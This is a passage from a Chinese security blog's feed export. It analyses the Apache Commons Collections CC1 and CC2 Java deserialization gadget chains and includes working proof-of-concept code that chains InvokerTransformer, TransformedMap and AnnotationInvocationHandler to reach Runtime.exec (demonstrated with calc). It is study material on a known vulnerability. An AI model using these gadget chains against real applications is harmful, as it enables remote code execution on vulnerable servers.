class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;cc2payload.ser&quot;</span>));</span><br><span class="line">            outputStream.writeObject(pq);</span><br><span class="line">            outputStream.close();</span><br><span class="line"></span><br><span class="line">            <span class="type">ObjectInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;cc2payload.ser&quot;</span>));</span><br><span class="line">            inputStream.readObject();</span><br><span class="line">            inputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//通过反射给对象属性赋值，避免代码冗余繁琐</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>实现demo：<br><img src="/posts/7e30cd4a/cc2-38.png" title="实现demo"></p><p>其中报错跟上文cc2分析和<code>TemplatesImpl</code>类学习的报错一样就不再赘述了</p><h1 id="0x06、总结"><a href="#0x06、总结" class="headerlink" title="0x06、总结"></a>0x06、总结</h1><p>总的来说cc2-yso链比普通链复杂了很多，其中也学习了javassist生成字节码，再到TemplatesImpl去读取字节码实例化，最后结合优先级队列实现命令执行。<br>绕来绕去这中间确实花了不少时间，有些调用细节还是需要多看一下才能发现精髓（也确实费时间），但对调用的很多类都还没有从jdk源码上真正明白他们每个类的每个方法是实现怎样的作用，只从利用链角度去了解了调用到的链的类的相关原理，后面尽量多去了解那些类的原理。</p><h1 id="0x07、参考链接"><a href="#0x07、参考链接" class="headerlink" title="0x07、参考链接"></a>0x07、参考链接</h1><p><a href="https://www.cnblogs.com/nice0e3/p/13811335.html">https://www.cnblogs.com/nice0e3/p/13811335.html</a><br><a href="https://www.cnblogs.com/hlkawa/p/15383289.html">https://www.cnblogs.com/hlkawa/p/15383289.html</a><br><a href="https://www.jianshu.com/p/cb591a12f50c">https://www.jianshu.com/p/cb591a12f50c</a><br><a href="https://paper.seebug.org/1242/#commonscollections-2">https://paper.seebug.org/1242/#commonscollections-2</a><br><a href="https://www.anquanke.com/post/id/247044?from=timeline#h2-0">https://www.anquanke.com/post/id/247044?from=timeline#h2-0</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
          <category> java利用链 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
            <tag> java利用链 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java安全-CC1链学习与分析</title>
      <link href="/posts/dd664be3.html"/>
      <url>/posts/dd664be3.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>针对CC链的分析，主要还是以逆向思维为主（从结果分析过程），从中尽可能学习出问题的地方在哪，哪里调用的这个带问题的地方，一步步思考。</p><h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p><blockquote><p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p></blockquote><p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p><p>CC1链分为两条链，一条为<code>TransformedMap</code>(也是最初的CC1链)，一条为<code>LazyMap</code>，其中有的分析把<code>TransformedMap</code>链单独分出来作为CC链，把<code>LazyMap</code>链作为CC1链。也可以作为CC1的两条链，一起学习下。</p><h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66(cc1链要求java版本小于jdk8u71,不得不说这个版本确实有点老了)<br><br>jdk官方下载链接：<a href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html%EF%BC%8C%E6%89%BE%E5%88%B0%E5%AF%B9%E5%BA%94%E7%89%88%E6%9C%AC%E4%BD%8E%E4%BA%8E8u71%E7%9A%84%E5%B0%B1%E8%A1%8C%E3%80%82">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html，找到对应版本低于8u71的就行。</a></p><p><strong>添加Maven项目</strong><br>新建Maven项目——&gt;pom.xml添加Commons Collections组件依赖,3系列除3.2.2版本外，其余均收该漏洞影响，添加3系列其中一个版本即可</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">3.2</span><span class="number">.1</span>&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure><p><img src="/posts/dd664be3/cc1-1.png" title="maven环境"></p><p><strong>导入sun包</strong></p><blockquote><p>因为cc1链需要用到sun包中的类，sun包在jdk中的代码是通过class文件反编译来的，为.class文件，查看不到源码.java文件，不便于调试，且直接观看class文件的阅读性跟java文件有出入，所以下载jdk源码sun包导入，便可查看到java源码文件，方便调试阅读</p></blockquote><p>步骤:<br>下载jdk源码：<a href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk">https://hg.openjdk.java.net/jdk8u/jdk8u/jdk</a><br>按网上步骤解压出src文件夹，再把&#x2F;src&#x2F;share&#x2F;classes&#x2F;sun文件夹放到解压出来的src文件夹根目录</p><p><img src="/posts/dd664be3/cc1-2.png" title="sun环境"><br><img src="/posts/dd664be3/cc1-3.png" title="sun环境"></p><p>在项目结构中对应jdk版本下添加包即可如下图</p><p><img src="/posts/dd664be3/cc1-4.png" title="sun环境"></p><p>随后在分析过程对应maven里Commons Collections包的class文件上方提示下载源代码，下载就可以看到Commons Collections包的java源码</p><p><img src="/posts/dd664be3/cc1-5.png" title="查看到源码"></p><h1 id="0x03、利用链接口及实现类"><a href="#0x03、利用链接口及实现类" class="headerlink" title="0x03、利用链接口及实现类"></a>0x03、利用链接口及实现类</h1><p>CC1链的利用点为<code>Commons Collections</code>包中的<code>Transformer</code>接口，通过下面后半段的利用链可以了解<code>Transformer</code>接口相关涉及实现它的<code>ChainedTransformer</code>类、<code>ConstantTransformer</code>类、<code>InvokerTransformer</code>类。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">yso-cc1链后半段利用链</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">    ConstantTransformer.transform()</span><br><span class="line">    InvokerTransformer.transform()</span><br><span class="line">        Method.invoke()</span><br><span class="line">            Class.getMethod()</span><br><span class="line">    InvokerTransformer.transform()</span><br><span class="line">        Method.invoke()</span><br><span class="line">            Runtime.getRuntime()</span><br><span class="line">    InvokerTransformer.transform()</span><br><span class="line">        Method.invoke()</span><br><span class="line">            Runtime.exec()</span><br></pre></td></tr></table></figure><h2 id="Transformer接口"><a href="#Transformer接口" class="headerlink" title="Transformer接口"></a>Transformer接口</h2><p>&#x2F;&#x2F;我理解为 转换器接口<br><code>Transformer</code>接口只有一个<code>public Object transform(Object input)</code>方法，返回一个被转换的Object对象</p><p><img src="/posts/dd664be3/cc1-6.png" title="Transformer接口"></p><p>Transformer接口实现的类，包括利用链中的关键的类，这些类都实现了<code>Transformer</code>以及序列化<code>serializable</code>。</p><p><img src="/posts/dd664be3/cc1-7.png" title="Transformer实现的类"></p><h2 id="ChainedTransformer类"><a href="#ChainedTransformer类" class="headerlink" title="ChainedTransformer类"></a>ChainedTransformer类</h2><p>&#x2F;&#x2F;我理解为 链转换类<br><code>ChainedTransformer</code>的作用为链式调用，将传入的<code>Transformer</code>数组依次调用每一个<code>Transformer</code>的<code>transform</code>方法，将第一个的转换返回<code>Object</code>对象的作为下次循环的的输入对象在<code>Transformer</code>的<code>transform</code>中被调用，以此循环。</p><p><img src="/posts/dd664be3/cc1-8.png" title="ChainedTransformer类"></p><h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p>&#x2F;&#x2F;我理解为 对象转换类<br>这里定义了一个<code>iConstant</code>对象<br><code>private final Object iConstant;</code></p><p><img src="/posts/dd664be3/cc1-9.png" title="ConstantTransformer类"></p><p>作用就是接受任何传进来的对象，并转换成定义的<code>iConstant</code>对象返回，相对起来很好理解。</p><h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>&#x2F;&#x2F;我理解为 调用转换类<br><code>InvokerTransformer</code>类的作用为获取调用的<font color="red">方法名</font>、<font color="red">参数类型</font>、<font color="red">函数的参数列表</font></p><p><img src="/posts/dd664be3/cc1-10.png" title="InvokerTransformer"></p><p>调用的<code>transform</code>获取了<font color="red">对象的类，方法、并返回执行方法，类、方法</font>、<font color="red">参数均为输入的对象，可控</font>，因此该类是cc1链的最重点的执行部分。</p><p><img src="/posts/dd664be3/cc1-11.png" title="InvokerTransformer"></p><p>通过正常反射执行<code>Runtime.exec()</code>方法</p><p><img src="/posts/dd664be3/cc1-12.png" title="正常反射执行exec"></p><p>通过<code>InvokerTransformer</code>类执行<code>Runtime.exec()</code>方法</p><p><img src="/posts/dd664be3/cc1-13.png" title="正常反射执行exec"></p><p>poc-demo:</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//获取Runtime对象</span></span><br><span class="line">        Runtime run=Runtime.getRuntime();</span><br><span class="line">        <span class="comment">//通过Object对象反射回去Runtime对象</span></span><br><span class="line">        <span class="comment">//Object obj=Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;));</span></span><br><span class="line">        <span class="comment">//获取构造InvokerTransformer对象</span></span><br><span class="line">        InvokerTransformer iv=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        <span class="comment">//执行InvokerTransformer.transform方法</span></span><br><span class="line">        iv.transform(run);</span><br></pre></td></tr></table></figure><p>这下很好理解<code>InvokerTransformer</code>这个类的就是为了获取对象以及方法和执行参数，且该对象可控。</p><h1 id="0x04、CC1链分析"><a href="#0x04、CC1链分析" class="headerlink" title="0x04、CC1链分析"></a>0x04、CC1链分析</h1><p>从利用链接口和实现类可知<code>InvokerTransformer</code>为最后最重要的执行类，因此该链的分析思路就相对清晰，反查哪些类实现了<code>InvokerTransformer.transform()</code>方法，输入源为反序列化<code>readObject</code>，也就是先搜索最后调用了<code>InvokerTransformer.transform(Object)</code>方法，且实现<code>serializable</code>序列化，以<code>readObject</code>为输入源的类及方法。<br>搜索结果有21个，除去自身测试的，还有20个，满足上述条件（调用<code>transform(Object)</code>、实现了反序列化接口<code>serializable</code>）的有6个类。</p><p><img src="/posts/dd664be3/cc1-14.png" title="满足条件类"></p><p>共8个方法</p><p><img src="/posts/dd664be3/cc1-15.png" title="满足条件类"></p><p>先学习分析一下TransformedMap链和LazyMap链，也就是CC1的两条链。</p><h2 id="TransformedMap链"><a href="#TransformedMap链" class="headerlink" title="TransformedMap链"></a>TransformedMap链</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><code>TransformedMap</code>类作用是对Map进行装饰，通过<code>keyTransformer</code>、<code>valueTransformer</code>分别对输入的<code>key</code>、<code>value</code>通过<code>transform()</code>方法进行修饰，查看构造函数，接受三个参数（<code>Map</code>的对象、<code>Transformer</code>的两个对象分别为<code>key</code>、<code>value</code>。），将接受的<code>key，value</code>对象转换为本类的<code>Transformer</code>对象</p><p><img src="/posts/dd664be3/cc1-16.png" title="构造函数"></p><p>可调用静态方法（map类型）<code>decorate</code>对新<code>Map</code>对象进行回调，对传入新的<code>Map</code>进行修饰，也就是说可以通过<code>decorate</code>方法去获取<code>TransformedMap</code>的对象</p><p><img src="/posts/dd664be3/cc1-17.png" title="decorate回调"></p><p>简单了解<code>TransformedMap</code>类后，现在回到利用链本身来，找到可以实现的<code>transform(Object)</code>的地方</p><p><img src="/posts/dd664be3/cc1-18.png" title="decorate回调"></p><p>三个方法</p><ul><li>transformKey(Object object)</li><li>transformValue(Object object)</li><li>checkSetValue(Object value)</li></ul><p>其中<code>transformKey</code>、<code>transformValue</code>两个方法分别获取从<code>TransformedMap</code>类的构造方法中传入<code>Transformer keyTransformer</code>、<code>Transformer valueTransformer</code>，再分别调用<code>keyTransformer.transform(object)</code>、<code>valueTransformer.transform(object)</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//transformKey方法</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformKey</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (keyTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> object;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> keyTransformer.transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//transformValue方法</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">transformValue</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (valueTransformer == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> object;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(object);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>查看这两个方法都在哪调用</p><p><img src="/posts/dd664be3/cc1-19.png" title="transformKey方法调用"><br><img src="/posts/dd664be3/cc1-20.png" title="transformValue方法调用"></p><p>这两个方法都在put方法中进行调用，参数就为两个<code>Object</code>对象，传递任意一个参数都可调用对应的<code>transformKey/Value</code>方法，最后put放入<code>key</code>和<code>value</code>。</p><p><img src="/posts/dd664be3/cc1-21.png" title="put方法"></p><p>利用思路：<br>因为<code>TransformedMap</code>中构造函数、<code>transformKey</code>、<code>transformValue</code>方法都是<code>protected</code>受保护的，无法直接声明使用，但可调用<code>decorate</code>公共方法进行回调向构造方法传参，通过<code>transformKey</code>或者<code>transformValue</code>传递其中任意一个参数为<code>InvokerTransformer</code>对象，最后通过<code>TransformedMap</code>的<code>put</code>方法传入恶意函数对象达到执行命令。<br>即：<br>第一步，创建构造参数（<code>Map</code>的对象、<code>Transformer</code>的两个对象分别为<code>key</code>、<code>value</code>），其中key或者value可以随意创造其中一个为<code>InvokerTransformer</code>类对象即可<br>第二步，通过<code>decorate</code>公共方法调用构造方法创建<code>TransformedMap</code>对象<br>第三步，调用<code>TransformedMap</code>的<code>put</code>方法，传递恶意函数对象，对其中key和value参数随便传入一个即可<br>利用方法：</p><p><img src="/posts/dd664be3/cc1-22.png" title="利用"></p><p>但上面这两个方法都在本类Put方法进行调用，也未在其他类中进行调用，同时使用到了<code>InvokerTransformer</code>、<code>Map</code>两个类的对象，因此无法通过readObject反序列化达到命令执行的目的。<br><font color="red">注：反序列化的序列化对象只能为单个对象，无法对多个对象进行序列化。</font></p><p>接下来看第三个方法：<code>checkSetValue(Object value)</code></p><p><img src="/posts/dd664be3/cc1-23.png" title="checkSetValue方法"></p><p>同样也是返回构造方法传入的<code>Transformer valueTransformer</code>，然后调用<code>transform(Object)</code>，但是由于是<code>protected</code>受保护，因此无法像另外两个方法一样直接调用。<br>再看该方法有没有其他类对其调用</p><p><img src="/posts/dd664be3/cc1-24.png" title="checkSetValue方法"></p><p>发现除了本类以外的父类<code>AbstractInputCheckedMapDecorator</code>中的内部类<code>MapEntry</code>的<code>setValue()</code>方法对其进行了调用，该类</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">MapEntry</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapEntryDecorator</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/** The parent map */</span></span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">final</span> AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">MapEntry</span><span class="params">(Map.Entry entry, AbstractInputCheckedMapDecorator parent)</span> &#123;</span><br><span class="line">            <span class="built_in">super</span>(entry);</span><br><span class="line">            <span class="built_in">this</span>.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">setValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">            value = parent.checkSetValue(value);</span><br><span class="line">            <span class="keyword">return</span> entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>官方对该类的描述翻译：</p><blockquote><p>一个抽象基类，简化了创建地图装饰器的任务。<br>MapAPI很难正确修饰，并且涉及实现许多不同的类。这个类的存在是为了提供一个更简单的API。<br>提供了特殊的钩子方法，当对象被添加到地图时调用这些方法。通过重写这些方法，可以验证或操纵输入。除了主要的映射方法，entrySet也会受到影响，这是编写映射实现最困难的部分。<br>该类是包范围的，在将来的Commons Collections版本中可能会被撤回或替换</p></blockquote><p>实现调用<br>前面步骤跟另外两个方法一样，由于不能直接调用，因此重点就在for循环里面，通过遍历<code>HashMap</code>键值对（<code>entrySet()</code>为<code>hashMap</code>映射识图，能返回<code>map</code>键值对），调用<code>setValue()</code>方法</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer)</span></span><br><span class="line">        <span class="comment">//第一个参数Map对象</span></span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;2&quot;</span>);</span><br><span class="line">        <span class="comment">//第二个参数和第三个参数类型一致，且有一个即可调用，传入InvokerTransformer对象</span></span><br><span class="line">        InvokerTransformer iv=<span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;);</span><br><span class="line">        <span class="comment">//调用decorate实现实例化对象并调用构造函数传参,Map类型必须为&lt;Object,Object&gt;，否则for循环调用tm对象会导致参数类型不一致会报错</span></span><br><span class="line">        Map&lt;Object,Object&gt; tm= TransformedMap.decorate(map,<span class="literal">null</span>,iv);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>( Map.Entry entry: tm.entrySet()) &#123;</span><br><span class="line">            <span class="comment">//调用setValue，传递Runtime对象</span></span><br><span class="line">            entry.setValue(Runtime.getRuntime()); </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><img src="/posts/dd664be3/cc1-25.png" title="实现调用"></p><p>现在发现父类<code>AbstractInputCheckedMapDecorator</code>中的内部类<code>MapEntry</code>的<code>setValue()</code>方法对其进行了调用，下一个思路就是找到实现序列化接口并且能调用<code>setValue()</code>方法的</p><p><img src="/posts/dd664be3/cc1-26.png" title="setValue()调用"></p><p>找到42个方法，其中<code>AnnotationInvocationHandler</code>类实现了序列化接口，同时重写了<code>readObject</code>方法，并且<code>setValue()</code>在重写的<code>readObject</code>方法中进行调用<br>其中构造函数获取两个参数，一个class类型<code>Class type</code>,一个Map类型<code>Map memberValues</code>，然后进行了type的类型判断，最后返回给变量</p><p><img src="/posts/dd664be3/cc1-28.png" title="AbstractInputCheckedMapDecorator类"></p><p>序列化前半段也是通过<code>getInstance</code>方法对type类型进行判断,判断type的类型是否为注解类的方法类型名，是的话便通过<code>memberTypes()</code>方法获取其成员方法名和返回方法，存在Map类型的<code>memberTypes</code>对象中</p><p><img src="/posts/dd664be3/cc1-27.png" title="重写序列化方法"></p><p>后半段也是最主要的for循环部分，遍历<code>memberValues</code>也就是构造方法传入的第二个参数（传入TransformedMap[]数组），循环获取键名，通过<code>memberTypes.get(name)</code>判断键名是否是注解类（Annotation类，全名java.lang.annotation.Annotation）的方法类型名，如果是的话就获取键值给<code>value</code>变量，<strong>这里通过键名设置注解类（Annotation类）的实例方法名即可通过条件判断</strong>。<br>接下来继续判断<code>if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)</code>意思判断value的值如果不是注解类的方法或者键名的值是ExceptionProxy的实例，则通过<code>memberValue.setValue</code>方法修改该键名的值，<strong>这里只用键值不是注解类（Annotation类）的实例方法名即可满足条件判断</strong>，然后调用<code>memberValue.setValue</code>方法达到目的<br>可以找到注解类Annotation的实现方法（找到引用的java.lang.annotation.Annotation，Ctrl+Alt+鼠标左键点击Annotation即可找到对应的实现方法），找到其中对应有成员的任意方法</p><p><img src="/posts/dd664be3/cc1-31.png" title="实现方法"></p><p>比如Generated注释类，可以put value方法名。（实际测试过程中找到的实现方法有大部分还是不能触发，只有部分类和方法才行）</p><p><img src="/posts/dd664be3/cc1-32.png" title="Generated类"></p><p>现在利用链就完整了，入口点为<code>AnnotationInvocationHandler</code>类的反序列化<code>readObject</code>方法，一直到最后调用<code>InvokerTransformer.transform(Object)</code>方法</p><h3 id="完整利用链"><a href="#完整利用链" class="headerlink" title="完整利用链"></a>完整利用链</h3><p>TransformedMap CC1链</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                TransformedMap.entrySet()</span><br><span class="line">                    AbstractInputCheckedMapDecorator.MapEntry.setValue()</span><br><span class="line">                        TransformedMap.checkSetValue()</span><br><span class="line">                            ChainedTransformer.transform()</span><br><span class="line">                                ConstantTransformer.transform()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Class.getMethod()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.getRuntime()</span><br><span class="line">                                InvokerTransformer.transform()</span><br><span class="line">                                    Method.invoke()</span><br><span class="line">                                        Runtime.exec()</span><br></pre></td></tr></table></figure><p>其中通过上述学习还没涉及到<code>ChainedTransformer.transform()</code>这个环节的利用方法，在构造Poc中可以学习下利用方法和原理</p><h3 id="构造POC"><a href="#构造POC" class="headerlink" title="构造POC"></a>构造POC</h3><p>理思路<br>1、入口点在为<code>AnnotationInvocationHandler</code>类的反序列化<code>readObject</code>方法中调用<code>setValue()</code>方法，但<code>AnnotationInvocationHandler</code>这个类未声明Public，只有通过反射进行调用。<br>通过反射调用<code>AnnotationInvocationHandler</code>类对象，并且调用构造方法，然后通过实例化向构造方法传参</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取AnnotationInvocationHandler类对象</span></span><br><span class="line">Class cla=Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="comment">//获取AnnotationInvocationHandler类构造方法，参数为一个类对象和一个Map对象</span></span><br><span class="line">Constructor cons=cla.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line"><span class="comment">//传入参数用a,b代替表示</span></span><br><span class="line">Object obj=cons.newInstance(a,b);</span><br></pre></td></tr></table></figure><p>2、接下来久要对传参内容进行确定，传入什么，其中a为Class类对象，b为Map对象，通过反序列化调用，从利用链的分析知道a传入的为注解类<code>Annotation</code>类，可以找到的<code>Generated</code>类的<code>value</code>名称，同时建立<code>HashMap</code>，并put键名为<code>value</code>，键值为任意即可绕过for循环的判断</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">Object obj=cons.newInstance(Generated.class,b);</span><br></pre></td></tr></table></figure><p>b为Map对象，并且该参数会执行调用到<code>AnnotationInvocationHandler</code>类<code>readObject</code>方法中的<code>AbstractMapEntryDecorator.MapEntry.setValue()</code>，从而在<code>setValue()</code>方法中调用到<code>TransformedMap.checkSetValue()</code>方法，最后返回调用到<code>TransformedMap</code>中<code>valueTransformer.transform()</code>方法，<code>valueTransformer</code>为<code>TransformedMap</code>构造函数的第三个参数即传入<code>InvokerTransformer</code>类对象，<code>Runtime</code>对象作为<code>transform(Object)</code>参数传入的值<br>但由于Runtime对象未实现序列化接口，无法序列化，并且<code>valueTransformer.transform(Object)</code>中的Object实际并不可控设置为Runtime对象值。因此利用到了<code>ChainedTransformer</code>类，也是上文学习中未提及实际利用方法的类，该类传入Transformer数组，并由transform方法实现循环调用。</p><p><img src="/posts/dd664be3/cc1-34.png" title="ChainedTransformer类"></p><p>因为<code>Runtime</code>类未实现序列化接口，只有通过反射实现对它的调用，即<code>Runtime.class</code>，再由于这个循环会有一个初识的transform(Object)，其中的Object在第一次循环的时候是由调用<code>ChainedTransformer.transform(Object)</code>传入的（传入的重写的反序列化方法中setValue()中的值），并没有实际传入的类对象。</p><p><img src="/posts/dd664be3/cc1-35.png" title="初始的Object值"></p><p>此时通过调用<code>ConstantTransformer</code>类来解决这个问题，一来可以通过它来实现返回<code>Runtime.class</code>对象，二来通过把他设置为<code>TransformedMap</code>数组的首位来规避初始调用的<code>Object</code>的问题，因为<code>ConstantTransformer</code>的<code>transform(Object)</code>不管输入什么都返回构造方法中的对象，然后再通过反射构建<code>Runtime</code>对象并调用<code>exec</code>方法，最后执行命令。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="comment">//获取Runtime类对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">//反射调用getMethod方法，获取Runtime类的getRuntime方法，返回Runtime.getRuntime()方法，此时并未执行该方法，因此并未实例化</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用invoke方法，执行Runtime.getRuntime()方法，实现Runtime对象的实例化并返回Runtime对象</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="comment">//反射调用exec方法，并执行该方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//通过链转换器进行循环调用transformers数组</span></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 